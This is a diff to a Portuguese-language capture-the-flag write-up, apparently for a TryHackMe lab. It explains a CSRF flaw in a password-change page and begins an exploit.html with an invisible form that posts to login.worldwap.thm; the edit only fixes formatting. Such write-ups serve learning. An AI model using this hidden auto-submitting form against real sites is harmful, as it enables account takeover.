@@ -77,9 +77,9 @@ Dentro do painel do moderador, havia um sistema de mensagens capaz de enviar lin
 A página change_password.php apresentava uma falha grave: permitia alterar a senha sem exigir a senha antiga, tornando o endpoint vulnerável a CSRF.
 
 #### 1. Criação do Exploit
-Um arquivo exploit.html foi criado com um formulário invisível que altera a senha automaticamente:
+Um arquivo `exploit.html` foi criado com um formulário invisível que altera a senha automaticamente:
 
-```bash
+```html
 <html>
   <body>
     <form action="http://login.worldwap.thm/change_password.php" method="POST">
